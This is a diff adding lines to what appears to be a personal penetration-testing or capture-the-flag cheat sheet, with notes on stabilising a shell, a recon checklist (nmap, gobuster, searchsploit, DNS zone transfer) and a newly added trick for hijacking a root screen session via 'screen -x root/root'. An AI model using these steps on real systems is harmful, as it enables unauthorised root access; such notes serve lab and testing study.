@@ -34,6 +34,10 @@ CTRL + Z
 stty raw -echo
 fg
 
+SCREEN HI-JACK ROOT SUID SESSION
+screen -x root/root
+The said screen was ran with: "/bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done"
+
 STUCK??
 nmap tcp? udp? -sS -Pn -p-? https on 80? http has php? CTRL+U? gobuster/dirbuster? subdoms/vhosts? hidden files? stego?
 versions? updatedb searchsploit? google dorks xploits? ~? dns axfr @ip ?
